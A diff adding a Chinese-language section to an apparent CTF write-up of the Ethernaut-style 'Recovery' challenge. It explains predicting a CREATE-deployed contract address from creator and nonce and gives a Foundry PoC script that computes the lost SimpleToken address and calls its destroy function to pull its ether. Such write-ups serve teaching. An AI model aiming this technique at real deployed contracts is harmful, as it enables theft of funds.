@@ -98,3 +98,36 @@ contract Attack is Script{
     }
 }
 ```
+
+使用create地址预测重新做一遍
+
+正常来说create地址需要这样预测`address = keccak256(RLP([creator, nonce]))[12:]`，但是直接写会发生报错，因为Solidity 本身没有内置 RLP 编码函数，需要引入第三方 RLP 库或者手动编码。所以直接用vm作弊码写这道题比较方便
+
+在foundry框架中，已经封装好了，利用`vm.computeCreateAddress(地址，Nonce)`即可直接求出SimpleToken的合约地址
+
+合约账户创建后，其账户 nonce 初始化为 1，第一次通过 CREATE 创建子合约时使用 nonce=1，EOA第一次发送交易Nonce从0开始
+
+### Poc：
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "../src/Recovery.sol";
+
+contract Attack is Script {
+    SimpleToken target = SimpleToken(payable(vm.computeCreateAddress(0x970F22585cc859129eaC87277c874AB000ead6d0, 1)));
+
+    function run() external {
+        vm.startBroadcast();
+        
+        target.destroy(payable(msg.sender));
+        
+        vm.stopBroadcast();
+    }
+}
+```
+
+
+
